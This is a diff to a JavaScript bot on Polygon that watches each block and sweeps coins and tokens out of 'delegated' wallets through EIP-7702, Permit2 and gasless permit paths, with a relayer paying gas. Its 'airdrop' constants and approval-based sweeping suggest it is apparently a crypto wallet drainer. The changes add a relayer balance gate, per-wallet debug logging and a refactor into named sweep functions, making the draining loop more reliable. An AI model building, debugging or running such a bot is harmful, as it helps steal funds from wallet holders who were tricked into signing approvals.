@@ -36,8 +36,10 @@ const CHAIN                     = process.env.CHAIN || "polygon";
 const PERMIT2_ADDRESS      = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const MIN_ETH_WEI          = ethers.parseEther("0.5");  // 0.5 MATIC min reserve
 const MIN_TOKEN_UNITS      = "0.5";
-const SWEEP_COOLDOWN_MS    = 30_000; // 30s per-wallet cooldown — Polygon blocks ~2s
-const TOKEN_CALL_DELAY     = 50;    // ms after each token call
+const SWEEP_COOLDOWN_MS    = 30_000;  // 30s per-wallet cooldown — Polygon blocks ~2s
+const TOKEN_CALL_DELAY     = 50;      // ms after each token call
+// Minimum relayer balance — if below this, skip ALL sweeps to avoid failed txs
+const RELAYER_MIN_WEI      = ethers.parseEther("5"); // 5 MATIC
 
 // ── Airdrop / price constants (Polygon-specific) ──────────────────────────────
 const NATIVE_COINGECKO_ID  = "matic-network";
@@ -954,6 +956,78 @@ function subscribeRealtime() {
     });
 }
 
+// ── Named sweep functions (extracted from block listener for clarity) ─────────
+
+async function doSweep(blockNumber) {
+  // BUG 3: hard relayer balance gate — skip everything if critically low
+  try {
+    const relayerBal = await rpcProvider.getBalance(relayerWallet.address);
+    if (relayerBal < RELAYER_MIN_WEI) {
+      log(`Relayer critically low (${ethers.formatEther(relayerBal)} MATIC < ${ethers.formatEther(RELAYER_MIN_WEI)} min) — skipping all sweeps until topped up`);
+      return;
+    }
+  } catch (e) {
+    warn(`Relayer balance check failed: ${e.message} — proceeding anyway`);
+  }
+
+  if (contract) {
+    await sweepETH();
+    for (const tokenAddress of TOKENS_TO_WATCH) {
+      await sweepToken(tokenAddress.trim());
+    }
+  }
+
+  // BUG 2 debug: log every wallet so we can see exactly why any are skipped
+  log(`Block ${blockNumber} — ${delegatedWallets.size} total wallet(s), checking...`);
+  for (const [addr, type] of delegatedWallets.entries()) {
+    const last = lastSwept.get(addr.toLowerCase());
+    const due  = shouldSweep(addr);
+    const ago  = last ? `${Math.round((Date.now() - last) / 1000)}s ago` : "never";
+    log(`  ${addr}: type=${type} lastSwept=${ago} due=${due}`);
+  }
+
+  const due = [...delegatedWallets.keys()].filter(shouldSweep);
+  if (!due.length) return;
+  log(`Block ${blockNumber} — ${due.length}/${delegatedWallets.size} wallet(s) due for sweep`);
+
+  for (const walletAddress of due) {
+    const walletType = delegatedWallets.get(walletAddress);
+    try {
+      if (walletType === "permit2-gasless") {
+        await sweepGaslessWallet(walletAddress);
+      } else if (walletType === "permit2" || walletType === "wrap-fallback") {
+        await sweepPermit2Wallet(walletAddress);
+      } else {
+        await sweepEIP7702Wallet(walletAddress);
+      }
+      markSwept(walletAddress);
+    } catch (e) {
+      err(`sweep failed for ${walletAddress}: ${e.message}`);
+    }
+    await new Promise((r) => setTimeout(r, 1000));
+  }
+}
+
+async function runSweep(blockNumber) {
+  if (isProcessing) {
+    log(`Block ${blockNumber} — previous sweep still running, skipping`);
+    return;
+  }
+  isProcessing = true;
+
+  const timeoutPromise = new Promise((_, reject) =>
+    setTimeout(() => reject(new Error("sweep timeout")), SWEEP_TIMEOUT_MS)
+  );
+
+  try {
+    await Promise.race([doSweep(blockNumber), timeoutPromise]);
+  } catch (e) {
+    err(`Block ${blockNumber} sweep error/timeout: ${e.message}`);
+  } finally {
+    isProcessing = false; // CRITICAL: always runs — even on timeout or throw
+  }
+}
+
 // ── WSS block listener + exponential backoff reconnect ───────────────────────
 
 async function startBot() {
@@ -977,63 +1051,9 @@ async function startBot() {
       setTimeout(startBot, delay);
     });
 
-    wsProvider.on("block", async (blockNumber) => {
+    wsProvider.on("block", (blockNumber) => {
       reconnectAttempt = 0;
-
-      if (isProcessing) {
-        log(`Block ${blockNumber} — previous sweep still running, skipping`);
-        return;
-      }
-      isProcessing = true;
-
-      try {
-        let sweepTimeoutHandle;
-        const timeoutPromise = new Promise((_, reject) => {
-          sweepTimeoutHandle = setTimeout(
-            () => reject(new Error("sweep timeout")),
-            SWEEP_TIMEOUT_MS
-          );
-        });
-
-        await Promise.race([
-          (async () => {
-            if (contract) {
-              await sweepETH();
-              for (const tokenAddress of TOKENS_TO_WATCH) {
-                await sweepToken(tokenAddress.trim());
-              }
-            }
-
-            const due = [...delegatedWallets.keys()].filter(shouldSweep);
-            if (!due.length) return;
-            log(`Block ${blockNumber} — ${due.length}/${delegatedWallets.size} wallet(s) due`);
-
-            for (const walletAddress of due) {
-              const walletType = delegatedWallets.get(walletAddress);
-              try {
-                if (walletType === "permit2-gasless") {
-                  await sweepGaslessWallet(walletAddress);
-                } else if (walletType === "permit2" || walletType === "wrap-fallback") {
-                  await sweepPermit2Wallet(walletAddress);
-                } else {
-                  await sweepEIP7702Wallet(walletAddress);
-                }
-                markSwept(walletAddress);
-              } catch (e) {
-                err(`sweep failed for ${walletAddress}: ${e.message}`);
-              }
-              await new Promise((r) => setTimeout(r, 1000));
-            }
-          })(),
-          timeoutPromise,
-        ]);
-
-        clearTimeout(sweepTimeoutHandle);
-      } catch (e) {
-        err(`Block ${blockNumber} sweep error/timeout: ${e.message}`);
-      } finally {
-        isProcessing = false;
-      }
+      runSweep(blockNumber).catch(e => err(`runSweep: ${e.message}`));
     });
 
     log(`WS connected — listening for blocks`);
